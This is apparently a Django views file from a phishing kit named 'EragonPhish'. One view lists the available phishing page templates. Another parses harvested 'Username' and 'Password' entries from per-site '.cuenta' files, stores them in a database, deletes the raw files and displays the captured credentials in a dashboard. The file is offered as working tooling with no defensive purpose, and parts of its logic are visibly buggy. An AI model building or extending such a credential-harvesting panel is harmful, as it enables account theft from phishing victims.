from django.shortcuts import render
from .models import EragonPhish, ListaDePaginas
import os, re

# Create your views here.
def phishing_inicio(request):
    ruta = os.getcwd().split('eragonprojects')[-2]
    archivo1 = f'{ruta}/modules/pages'
    def ver(lista):
        if lista.exists():
            listapaginas = ListaDePaginas.objects.all()
            contexto = {
                'obj':listapaginas,
            }

        else:
            listasave = ListaDePaginas(name=pagina)
            listasave.save()
            listapaginas = ListaDePaginas.objects.all()
            contexto = {
                'obj':listapaginas,
            }

    if os.path.isfile(archivo1):
        paginafile = open(archivo1)
        for pagina in paginafile:
            lista = ListaDePaginas.objects.filter(name=pagina)
            ver(lista)
        listapaginas = ListaDePaginas.objects.all()
        contexto = {
            'obj':listapaginas
        }
        
    else:
        listapaginas = ListaDePaginas.objects.all()
        contexto = {
            'obj':listapaginas,
        }

    if os.path.isfile(archivo1):
        os.remove(archivo1)

    return render(request, 'index.html',contexto)

#No se puede usar return :'v
def phishing_datos(request, slug=None):
    ruta = os.getcwd().split('eragonprojects')[-2]
    archivo = f'{ruta}/websites/{slug}/.cuenta'
        
    if os.path.isfile(archivo):
        file = open(archivo, 'r')
        for linea in file:
            username = re.findall(r'Username.*', linea)
            password = re.findall(r'Password.*', linea)
            ustr = "".join(username).split('Password:')[-2]
            pstr = "".join(password).split(':')[1]
        
        '''
        for line in file:
            password = re.findall(r'Password.*', line)
            print(password)
            pstr = "".join(password).split(':')[1]
            break
        '''

        try:
            p = EragonPhish(user=ustr, passw=pstr, slug=slug)
            p.save()
            
            obj_phishing = EragonPhish.objects.filter(slug=slug)
            
        except EragonPhish.MultipleObjectsReturned:
            obj_phishing = EragonPhish.objects.filter(slug=slug)

        contexto = {
                'obj':obj_phishing
        }
        
        os.remove(archivo)
    
    else:
        obj_phishing = EragonPhish.objects.filter(slug=slug)
        if obj_phishing.exists():
           contexto = {
                'obj':obj_phishing,
            }
        else:
            contexto = {
                'msj':'Datos no encontrados.'
            }

        
        if os.path.isfile(archivo):
            os.remove(archivo)
        

    return render(request, 'phishing_datos.html', contexto)